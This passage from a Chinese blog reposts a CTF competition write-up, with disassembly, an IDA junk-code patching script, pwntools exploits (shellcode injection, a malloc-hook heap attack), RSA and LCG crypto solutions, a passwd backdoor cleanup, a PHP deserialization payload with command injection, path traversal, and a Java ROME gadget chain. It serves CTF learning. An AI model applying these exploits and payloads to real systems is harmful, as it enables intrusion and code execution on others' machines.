0x15]l=[]for i in range(len(v5)):    l.append(chr(sbox.index(v5[i])^i))print(&#x27;&#x27;.join(l))</span><br><span class="line">.text:</span><br><span class="line">00007FF674AA2348 83 7C 24 20 30                cmp     [rsp+30h+var_10], 30h ; &#x27;0&#x27;.text:</span><br><span class="line">00007FF674AA234D 0F 8D 75 00 00 00             jge     loc_7FF674AA23C8.text:</span><br><span class="line">00007FF674AA234D.text:</span><br><span class="line">00007FF674AA2353 E8 28 FB FF FF                call    sub_7FF674AA1E80.text:</span><br><span class="line">00007FF674AA2353.text:</span><br><span class="line">00007FF674AA2358 48 63 4C 24 20                movsxd  rcx, [rsp+30h+var_10].text:</span><br><span class="line">00007FF674AA235D 48 B8 AB 24 93 C5 55 7B A0 F1 mov     rax, 0F1A07B55C59324ABh.text:</span><br><span class="line">00007FF674AA2367 48 03 05 DA 8C 02 00          add     rax, cs:</span><br><span class="line">off_7FF674ACB048.text:</span><br><span class="line">00007FF674AA236E 0F BE 04 08                   movsx   eax, byte ptr [rax+rcx].text:</span><br><span class="line">00007FF674AA2372 48 63 54 24 20                movsxd  rdx, [rsp+30h+var_10].text:</span><br><span class="line">00007FF674AA2377 48 B9 45 AB 81 9C 0C 46 B9 0C mov     rcx, 0CB9460C9C81AB45h.text:</span><br><span class="line">00007FF674AA2381 48 03 0D C8 8C 02 00          add     rcx, cs:</span><br><span class="line">off_7FF674ACB050.text:</span><br><span class="line">00007FF674AA2388 0F BE 0C 11                   movsx   ecx, byte ptr [rcx+rdx].text:</span><br><span class="line">00007FF674AA238C 39 C8                         cmp     eax, ecx.text:</span><br><span class="line">00007FF674AA238E 0F 84 1F 00 00 00             jz      loc_7FF674AA23B3.text:</span><br><span class="line">00007FF674AA238E.text:</span><br><span class="line">00007FF674AA2394 B9 0A 00 00 00                mov     ecx, 0Ah.text:</span><br><span class="line">00007FF674AA2399 E8 52 00 00 00                call    sub_7FF674AA23F0.text:</span><br><span class="line">00007FF674AA2399.text:</span><br><span class="line">00007FF674AA239E 48 89 C1                      mov     rcx, rax                        ; Buffer.text:</span><br><span class="line">00007FF674AA23A1 E8 66 63 00 00                call    puts.text:</span><br><span class="line">00007FF674AA23A1.text:</span><br><span class="line">00007FF674AA23A6 C7 44 24 2C 00 00 00 00       mov     [rsp+30h+var_4], 0.text:</span><br><span class="line">00007FF674AA23AE E9 27 00 00 00                jmp     loc_7FF674AA23DA.text:</span><br><span class="line">00007FF674AA23AE.text:</span><br><span class="line">00007FF674AA23B3                               ; ---------------------------------------------------------------------------.text:</span><br><span class="line">00007FF674AA23B3.text:</span><br><span class="line">00007FF674AA23B3                               loc_7FF674AA23B3:                       ; CODE XREF: main+13E↑j.text:</span><br><span class="line">00007FF674AA23B3 E9 00 00 00 00                jmp     $+5.text:</span><br><span class="line">00007FF674AA23B3.text:</span><br><span class="line">00007FF674AA23B8                               ; ---------------------------------------------------------------------------.text:</span><br><span class="line">00007FF674AA23B8.text:</span><br><span class="line">00007FF674AA23B8                               loc_7FF674AA23B8:                       ; CODE XREF: main:</span><br><span class="line">loc_7FF674AA23B3↑j.text:</span><br><span class="line">00007FF674AA23B8 8B 44 24 20                   mov     eax, [rsp+30h+var_10].text:</span><br><span class="line">00007FF674AA23BC 83 C0 01                      add     eax, 1.text:</span><br><span class="line">00007FF674AA23BF 89 44 24 20                   mov     [rsp+30h+var_10], eax.text:</span><br><span class="line">00007FF674AA23C3 E9 80 FF FF FF                jmp     loc_7FF674AA2348</span><br><span class="line">Python&gt;print(&#x27;&#x27;.join([chr(ord(test[i])^i) for i in range(len(test))]))fmcddddlllldddd||||ddarjmcnurn~SEDDLOMKRQI]NCCR</span><br><span class="line">print(&#x27;&#x27;.join([chr(get_wide_byte(0x7FF674ACB000+i)^i) for i in range(0x30)]).replace(&quot;&amp;&quot;,&quot;x&quot;))</span><br><span class="line">push next opcodeAddr;jmp addr;</span><br><span class="line">比如retn 0x5其等价于：mov eip,[esp];add esp,0x4+0x5;</span><br><span class="line">004710D5 &gt;    E8 00000000   call 11111.004710DA004710DA  |.  68 10B14900   push 11111.0049B110这里执行call后，eip的值为004710DAh，而此时[esp]的值，就是0x4710DAh，因此获取call时的eip就是[esp]-0x5;</span><br><span class="line">push addrretn</span><br><span class="line">mov eax,[esp];add esp,0x4;</span><br><span class="line">.text:</span><br><span class="line">0000000140001A4E.text:</span><br><span class="line">0000000140001A4E                               loc_140001A4E:                        .text:</span><br><span class="line">0000000140001A4E 55                            push    rbp.text:</span><br><span class="line">0000000140001A4F E8 00 00 00 00                call    $+5.text:</span><br><span class="line">0000000140001A4F.text:</span><br><span class="line">0000000140001A54 48 83 04 24 10                add     qword ptr [rsp], 10h.text:</span><br><span class="line">0000000140001A59 EB 00                         jmp     short $+2.text:</span><br><span class="line">0000000140001A59.text:</span><br><span class="line">0000000140001A5B                               ; ------------------------------.text:</span><br><span class="line">0000000140001A5B.text:</span><br><span class="line">0000000140001A5B                               loc_140001A5B:                       .text:</span><br><span class="line">0000000140001A5B 41 59                         pop     r9.text:</span><br><span class="line">0000000140001A5D 41 FF D1                      call    r9</span><br><span class="line">start:    jx label2    jnx label2    db 0x1    db 0x2    db ...label2:    正常指令</span><br><span class="line">.text:</span><br><span class="line">0000000140001A9F E8 F1 FF FF FF                call    nullsub_14</span><br><span class="line">.text:</span><br><span class="line">0000000140001AB0 41 58                         pop     r8</span><br><span class="line">import ida_bytes, ida_idastart=0x140001A4Eend=  0x140003f76</span><br><span class="line">def patch(ea, num=1):    for i in range(num):        ida_bytes.patch_byte(ea + i, 0x90)    return</span><br><span class="line">def f(hexStr):    begin_addr=start    end_addr=end    l = []    xx = len(hexStr) // 3 + 1    bMask = bytes.fromhex(hexStr.replace(&#x27;00&#x27;, &#x27;01&#x27;).replace(&#x27;??&#x27;, &#x27;00&#x27;))    bPattern = bytes.fromhex(hexStr.replace(&#x27;??&#x27;, &#x27;00&#x27;))    signs = ida_bytes.BIN_SEARCH_FORWARD | ida_bytes.BIN_SEARCH_NOBREAK | ida_bytes.BIN_SEARCH_NOSHOW    while begin_addr &lt; end_addr:        ea = ida_bytes.bin_search(begin_addr, end_addr, bPattern, bMask, 1, signs)        if ea == ida_idaapi.BADADDR:            break        else:            l.append(ea)            begin_addr = ea + xx    return lg=lambda x,num:[print(hex(x), hex(num)),patch(x, num)]print(&quot;----------jx+jnx----------------&quot;)for x in f(&quot;74 ?? 75 ??&quot;):    num = get_wide_byte(x + 3) + 4    g(x,num)print(&quot;----------jump far(pop)----------&quot;)for x in f(&quot;E8 00 00 00 00 48 83 04 24&quot;):    num = get_wide_byte(x + 9)+5    t=get_wide_byte(x+num)    if t in [0x58,0x59]:        num+=1    elif t==0x41:        num+=2    else:        print(&quot;Special:&quot;,hex(x+num))        continue    g(x,num)print(&quot;-----jump far(retn)&amp;&amp;Jump far(Protect site)---------&quot;)for x in f(&quot;E8 ?? 00 00 00&quot;):    dbs = get_wide_byte(x + 1)    if dbs &lt; 0x15:        if get_wide_byte(x - 1) in [0x50, 0x51] and get_wide_byte(x + dbs + 5) in [0x58, 0x59]:            x -= 1            num = dbs + 8        elif get_wide_byte(x - 1) in list(range(0x50, 0x58)) and get_wide_byte(x + dbs + 5) == 0x41:            x -= 2            num = 11 + dbs        else:            num = 5 + get_wide_byte(x + dbs + 9)        print(hex(x), num)        g(x, num)print(&quot;---------jump db-------------&quot;)for x in f(&quot;E9 ?? 00 00 00&quot;):    t=get_wide_byte(x+1)    if t&lt;20:        num=t+5        g(x,num)print(&quot;---------call null function---------&quot;)for x in f(&quot;E8 ?? FF FF FF&quot;):    g(x,5)print(&quot;ojbk!&quot;)</span><br><span class="line">puts(&quot;1. Login as Admin&quot;);puts(&quot;2. Send Message to Admin&quot;);puts(&quot;3. Exit&quot;);if ( isAdmin == 1 )puts(&quot;4. Exec&quot;);</span><br><span class="line">return printf(&quot;&gt; &quot;);</span><br><span class="line">from pwn import*from libnum import *from ctypes import *from z3 import *import requests as reqs=lambda x:p.send(x)sl=lambda x:p.sendline(x)sa=lambda x,y:p.sendafter(x,y)sla=lambda x,y:p.sendlineafter(x,y)r=lambda :p.recv()rl=lambda :p.recvline()ru=lambda x:p.recvuntil(x)context.clear(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)url=&#x27;101.200.238.173&#x27;port=34948p=remote(url,port)shellcode=asm(shellcraft.sh())lin=[b&#x27;&gt; &#x27;]*3+[b&#x27;Password: &#x27;,b&#x27;&gt; &#x27;,b&#x27;Shellcode: &#x27;]lsend=[b&#x27;2&#x27;,b&#x27;a&#x27;*56,b&#x27;1&#x27;,b&#x27;SuperSecurePassword123!&#x27;,b&#x27;4&#x27;,shellcode]for i in range(len(lin)):    ru(lin[i])    print(lin[i],lsend[i])    sl(lsend[i])p.interactive()</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding:</span><br><span class="line">utf-8 -*-</span><br><span class="line">from pwn import *context.clear(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">sh = remote(&#x27;172.17.0.2&#x27;, 9541)</span><br><span class="line">def add(size, content):    sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;3&#x27;)    sh.sendlineafter(b&#x27;: &#x27;, str(size).encode())    sh.sendafter(b&#x27;: &#x27;, content)</span><br><span class="line">sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;1&#x27;)sh.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)sh.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)sh.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)sh.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)sh.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)sh.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)</span><br><span class="line">add(0x18, b&#x27;a&#x27; * 0x18 + p64(0xd81))sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;0&#x27; * 0x1000 + b&#x27;3&#x27;)sh.sendlineafter(b&#x27;: &#x27;, str(0x1000).encode())sh.sendafter(b&#x27;: &#x27;, b&#x27;xa0&#x27;)</span><br><span class="line">add(0xd50, b&#x27;xa0&#x27;)</span><br><span class="line">sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;4&#x27;)sh.sendlineafter(b&#x27;: &#x27;, b&#x27;2&#x27;)libc_addr = u64(sh.recvn(8)) - 0x3ec2a0success(&#x27;libc_addr: &#x27; + hex(libc_addr))sh.recvn(8)heap_addr = u64(sh.recvn(8)) - 0x1280success(&#x27;heap_addr: &#x27; + hex(heap_addr))</span><br><span class="line">add(0x18, b&#x27;a&#x27; * 0x18 + p64(0xffffffffffffffff))__realloc_hook = libc_addr + 0x3ebc28add((__realloc_hook - 8) - ((heap_addr + 0x22020) + 0x10) - 0x18, b&#x27;n&#x27;)add(0x18, b&#x27;0&#x27; * 8 + p64(libc_addr + 0x10a38c) + p64(libc_addr + 0x98c30 + 4)) # padding + __realloc_hook + __malloc_hook</span><br><span class="line">sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;0&#x27; * 0x1000 + b&#x27;3&#x27;)</span><br><span class="line">sh.interactive()</span><br><span class="line">letters = string.ascii_lowercaserandom_string = &#x27;&#x27;.join(random.choice(letters) for i in range(4))</span><br><span class="line">flag = base64.b64encode(flag[5:-1].encode()).decode()fg = [flag[i:i+4] for i in range(0, len(flag), 4)]</span><br><span class="line">for z,t in enumerate(k_box):    k_box[z] = t &lt;&lt; z    a=(reduce(xor,k_box)) &gt;&gt; 3 ^ s2n(j) ^ s2n(key[0]) &gt;&gt; 5a_boxs.append(a)</span><br><span class="line">from libnum import *from operator import xor</span><br><span class="line">from gmssl import sm3,funcimport base64,string,itertools,tqdmGKey=lambda x:</span><br><span class="line">sm3.sm3_hash(func.bytes_to_list(x.encode(&#x27;utf-8&#x27;)))def Crack():  for x in tqdm.tqdm([&#x27;&#x27;.join(x) for x in itertools.product(string.ascii_lowercase,repeat=4)]):    if GKey(x)==&quot;ed7c5e5a9e7db0af63ff1857c74f1612503714e7257e3135161ac693263c5bc3&quot;:      return xkey=Crack()assert key==&quot;vyxj&quot;k_boxs=[[85960428, 124048944], [76896516, 148233042, 148344300, 430828728], [18813226, 47434414, 384576428, 756186952, 1176559104, 3012655264], [32419498, 135200222, 144078312, 418343384, 264781840, 997176032, 1575860096, 2311119872], [78138466, 26105444, 246378096, 673137192, 780322864, 580638816, 1013888320, 8267513088, 18261797376, 38464371712], [74398718, 34836126, 114351808, 84194008, 864090304, 2058369664, 3768046400, 9054897920, 3609117696, 31962163200, 78609714176, 143030124544], [95136078, 121787282, 142893752, 595233264, 1428549856, 3051172768, 5077270848, 1495076864, 12870877440, 47778328576, 70943019008, 73837846528, 347317125120, 202464190464], [25940628, 178611312, 187525036, 724730696, 1262246272, 538422912, 5178823296, 11962676480, 3681039360, 43111816192, 53454863360, 46940395520, 324584484864, 738174935040, 1180945874944, 2680363352064], [91476910, 40438622, 284009216, 189141944, 494422624, 1909378272, 1859258688, 8325893632, 8679649792, 25956180480, 19010518016, 149400145920, 75571052544, 216012996608, 877107707904, 1918758420480, 4670701109248, 1511231979520], [74597483, 35476838, 332670940, 628899328, 1006051312, 1810494112, 1815836800, 6254008448, 9059957248, 37066194944, 84866486272, 143417882624, 374722654208, 421553152000, 289192411136, 2595834003456, 1876405256192, 3073277952000, 5138042585088, 16906505420800], [43202734, 123038960, 230151348, 227006016, 1316620848, 2661215424, 1102296384, 6063244416, 13653935872, 15262126080, 56829879296, 203848990720, 319030505472, 273716043776, 1328383262720, 3109532008448, 1974875389952, 10583088431104, 17563729002496, 41257490972672, 104812289982464, 173872034873344], [40707932, 62510266, 127238668, 433986608, 1493914656, 2017700128, 941191424, 4402769536, 6413621248, 34974545408, 76024111104, 149649319936, 63424671744, 591347908608, 1425053548544, 2109411262464, 3604948779008, 1747924942848, 12591446097920, 36837998985216, 14717609312256, 116828735012864, 67418525270016, 162300363276288]]a_boxs=[1320734445, 1299107274, 1462892431, 1369698413, 8147346610, 28131911745, 62500239353, 489185004903, 558579233563, 1461508494923, 30901854114296, 31037226326417]flag=[]for i in range(len(k_boxs)):  flag.append(n2s(a_boxs[i]^((reduce(xor,k_boxs[i]))&gt;&gt;3)^(s2n(key)&gt;&gt;5)).decode())flag=base64.b64decode(&#x27;&#x27;.join(flag)).decode()print(&quot;Key:%snFlag:</span><br><span class="line">flag&#123;%s&#125;&quot;%(key,flag))</span><br><span class="line">nbits=1024beta=0.25p = getPrime(nbits // 2)q = next_prime(p+getRandomNBitInteger(int(nbits*beta)))</span><br><span class="line">from Crypto.Util.number import *from libnum import *from gmpy2 import *p=10723952297843364786156929715608186673824989778827123114729658453167763205220791771822778751909012960229915274457218832420541336771509448047644069517341441q=10723952297843364786156929715608186673824989778827123114729658453167763205220864100075262838969409132981145925287473981410039353654288586176839546999980559c=4683860292178905393956126264938663681975905303901914717230332783725185630718947576830406810628786941566084952137064099532907383417183948121928037829755743872588634917591802704043136980938886111652461153361337562856144992151703143305512294568871604157763770074219187267063108239508617811016431179485003213035n=115003152886419983681144304614857464253607083192987092744909476881003877437075034587256814044556674185221251648000461436525204404176667857416335352906784895367609649446600147893387688176260185504558426661409555464100257797704637961842440960157067193151612929859347566584912178351943666596100822411740365045519e=39466n=p*qphi=(p-1)*(q-1)t=gcd(e,phi)d=invert(e//t, phi)m=powmod(c,d,n)m=iroot(m,t)flag = n2s(int(m[0])).decode()print(flag)#flag&#123;You-Know-ephi-not-invert&#125;</span><br><span class="line">primes = [getPrime(128) for _ in range(1000)]def getMyPrime(nbits: int):        while True:            n = 2            while n.bit_length() &lt; nbits:                n *= random.choice(primes)            if isPrime(n+1):                return n+1</span><br><span class="line">def Pollard_rho(N):    a = 2 # 为了快速计算以及满足费马小定理条件    n = 2 # 从1开始没必要    while (True):        a = pow(a, n, N)        p = gcd(a - 1, N)        if p != 1 and p != n:            return p        n += 1</span><br><span class="line">from Crypto.Util.number import *from libnum import *from gmpy2 import *N=105693066294692090428120492282360423623332948001444868155609687342896295733744325175901738933099577576305552497351171328636372334357226336334014475727532013770919058459498705840962386579296720075803313144948862168617254759061750303073242103385953470598588821298558182545075843037752946756268753654459857357773</span><br><span class="line">def Get():  a=2  primes=[...]  Mul_Group=1  for x in primes:    Mul_Group*=x  p=gcd(pow(a,Mul_Group,N)-1,N)  return p#p=Get()p=13537357593182943760549076001986916127729056585483232435862464322225222721242076952974902134443359026157925461451330929032089583284820898264165591023404647q=N//pphi=(p-1)*(q-1)c = 103098461800286996429171660021414925966093478619253436602232971969341281856030245006630388718292570005153435514675207542689431699948146670756537281552849614108826708534870688773921625688661211973873302580385044231926119768544392742128096319799969126263095425468271074769423608363979804283088125862297793195229e= 0x10001d=invert(e,phi) m=int(pow(c,d,N))flag=n2s(m).decode()print(flag)#flag&#123;Smooth-is-very-cool&#125;</span><br><span class="line">from Crypto.Util.number import *import gmpy2</span><br><span class="line">output = [119444446894587372581296728153418842424972532346323290092358901147846017532,116115165644797564522740358185970802120930635153965165009865786907134059364,37049123079699901350837013976856659163619369801178080438668856263818967139,5126114380624889407734309488357199346967937488993420757621013519949873892,72235467163060541611760931209616453277564984959523932791804478509097219171]t = []for i in range(1,len(output)):    t.append(output[i]-output[i-1])</span><br><span class="line">T = []for i in range(1,len(t)-1):    T.append(t[i+1]*t[i-1] - t[i]**2)</span><br><span class="line">m = []for i in range(len(T)-1):    mm = gmpy2.gcd(T[i],T[i+1])    if isPrime(mm):        m.append(int(mm))    else:        for i in range(1,100):            if isPrime(mm // i):                mm = mm // i                m.append(int(mm))                break</span><br><span class="line">for i in m:    a = gmpy2.invert(t[0],i) * t[1] % i    b = output[1] - a*output[0] % i    a_ = gmpy2.invert(a,i)</span><br><span class="line">    seed = a_ * (output[0]-b) % i    for _ in range(2**16):        seed = a_ * (seed - b) % i        flag = long_to_bytes(seed)        if b&#x27;flag&#x27; in flag:            print(flag.decode())#flag&#123;odd-Lcg-also-Cool&#125;</span><br><span class="line">from hashlib import *flag1=b&#x27;flag&#123;You-Know-ephi-not-invert&#125;&#x27;flag2=b&#x27;flag&#123;Smooth-is-very-cool&#125;&#x27;flag3=b&#x27;flag&#123;odd-Lcg-also-Cool&#125;&#x27;print(&quot;flag&#123;%s&#125;&quot;%md5((flag1+flag2+flag3)).hexdigest())#flag&#123;6ba1ccae1f3efb63be48c23ef8bb78d7&#125;</span><br><span class="line">strings Steganography.jpg | find &quot;flag&quot;</span><br><span class="line">ssh ctf@39.106.48.123 -p 18593cat /etc/passswd 或者用getent passwd</span><br><span class="line">root:x:0:0:</span><br><span class="line">root:/root:/bin/bashdaemon:x:1:1:</span><br><span class="line">daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:</span><br><span class="line">bin:/bin:/usr/sbin/nologinsys:x:3:3:</span><br><span class="line">sys:/dev:/usr/sbin/nologinsync:x:4:</span><br><span class="line">65534:</span><br><span class="line">sync:/bin:/bin/syncgames:x:5:60:</span><br><span class="line">games:/usr/games:/usr/sbin/nologinman:x:6:12:</span><br><span class="line">man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:</span><br><span class="line">mail:/var/mail:/usr/sbin/nologinnews:x:9:9:</span><br><span class="line">news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:</span><br><span class="line">uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:</span><br><span class="line">proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:</span><br><span class="line">www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:</span><br><span class="line">backup:/var/backups:/usr/sbin/nologinlist:x:38:38:</span><br><span class="line">Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:</span><br><span class="line">ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:</span><br><span class="line">Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:</span><br><span class="line">65534:</span><br><span class="line">65534:</span><br><span class="line">nobody:/nonexistent:/usr/sbin/nologin_apt:x:</span><br><span class="line">100:</span><br><span class="line">65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:</span><br><span class="line">101:</span><br><span class="line">102:</span><br><span class="line">systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:</span><br><span class="line">102:</span><br><span class="line">104:</span><br><span class="line">systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:</span><br><span class="line">103:</span><br><span class="line">105:</span><br><span class="line">systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:</span><br><span class="line">104:</span><br><span class="line">106::/nonexistent:/usr/sbin/nologinsshd:x:</span><br><span class="line">105:</span><br><span class="line">65534::/run/sshd:/usr/sbin/nologinbackdoor:x:0:</span><br><span class="line">1000::/home/backdoor:/sbin/nologinctf:x:</span><br><span class="line">1000:</span><br><span class="line">1001::/home/ctf:/bin/bash</span><br><span class="line">userdel -f -r backdoor</span><br><span class="line">id backdoor</span><br><span class="line">cat /flag</span><br><span class="line">&lt;?php  class one&#123;    public $a;  &#125;  class two&#123;    public $func;    public $arg;  &#125;  class three&#123;    public $kkk;  &#125;  class four&#123;    public $s;  &#125;  $one = new one();  $two = new two();  $three = new three();  $four = new four();  $four-&gt;s = &#x27;more$&#123;IFS&#125;/*&#x27;;  $three-&gt;kkk = $four;  $two-&gt;func = $three;  $one-&gt;a = $two;  $payload = base64_encode(serialize($one));  echo $payload;?&gt;</span><br><span class="line">http://**.**.**/?cmd=TzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjEyOiJtb3JlJHtJRlN9LyoiO319czozOiJhcmciO047fX0=</span><br><span class="line">GET /;/download?filename=%25%32%45%25%32%45%25%32%46%61%70%70%25%32%46%65%7a%4a%61%76%61%25%32%45%6a%61%72</span><br><span class="line">&lt;dependencies&gt;  &lt;dependency&gt;    &lt;groupId&gt;commons-collections&lt;/groupId&gt;    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    &lt;version&gt;3.2.1&lt;/version&gt;  &lt;/dependency&gt;  &lt;dependency&gt;    &lt;groupId&gt;rome&lt;/groupId&gt;    &lt;artifactId&gt;rome&lt;/artifactId&gt;    &lt;version&gt;1.0&lt;/version&gt;  &lt;/dependency&gt;&lt;/dependencies&gt;</span><br><span class="line">package org.Rome;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">public class Rome &#123;    public static void main(String[] args) throws Exception&#123;        byte[] bytes = Files.readAllBytes(Paths.get(&quot;.\src\main\java\org\Rome\ImageUtil.class&quot;));        TemplatesImpl templates = new TemplatesImpl();        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);        setFieldValue(templates,&quot;_class&quot;,null);        setFieldValue(templates, &quot;_name&quot;, &quot;ImageUtil&quot;);        EqualsBean bean = new EqualsBean(String.class, &quot;ImageUtil&quot;);        HashMap map1 = new HashMap();        HashMap map2 = new HashMap();        map1.put(&quot;yy&quot;, bean);        map1.put(&quot;zZ&quot;, templates);        map2.put(&quot;zZ&quot;, bean);        map2.put(&quot;yy&quot;, templates);        Hashtable table = new Hashtable();        table.put(map1, &quot;1&quot;);        table.put(map2, &quot;2&quot;);        setFieldValue(bean, &quot;_beanClass&quot;, Templates.class);        setFieldValue(bean, &quot;_obj&quot;, templates);        Serialize(table);    &#125;    public static void Serialize(Object object) throws Exception&#123;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;rome.bin&quot;));        objectOutputStream.writeObject(object);        objectOutputStream.close();        File file = new File(&quot;rome.bin&quot;);        byte[] fileContent = new byte[(int) file.length()];        FileInputStream fileInputStream = new FileInputStream(file);        fileInputStream.read(fileContent);        fileInputStream.close();        String base64Encoded = Base64.getEncoder().encodeToString(fileContent);        System.out.println(base64Encoded);    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    &#125;&#125;</span><br><span class="line">import requests as reqfrom urllib.parse import quoteurl=&quot;http://eci-2zed055p3vx2qdwqoe3x.cloudeci1.ichunqiu.com:</span><br><span class="line">8080&quot;api=&#x27;/evil&#x27;furl=url+apixx=&quot;.......................&quot;payload=&#123;    &quot;cmd&quot;:xx&#125;f=req.post(furl,data=payload)print(f.text)</span><br><span class="line">java.lang.RuntimeException: Could not execute equals()</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/197916.html">https://www.ctfiot.com/197916.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2024%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4WP.full.md">CTF大赛WP集合&#x2F;articles&#x2F;2024极客少年WP.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sbox-320-%E5%AD%97%E8%8A%82%E6%9F%A5%E6%89%BE%E8%A1%A8/">sbox 320 字节查找表</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Reverse/2024%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%B2%A4%E6%B8%AF%E6%BE%B3%E5%A4%A7%E6%B9%BE%E5%8C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWP-Reverse%E7%AF%87/" title="羊城杯 2024/chal (Reverse)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">羊城杯 2024/chal (Reverse)</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Reverse/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BRE-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/" title="2024 长城杯初赛 RE（easyre SSE 异或链）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024 长城杯初赛 RE（easyre SSE 异或链）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#coding"><span class="toc-number">1.</span> <span class="toc-text">-*- coding:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas 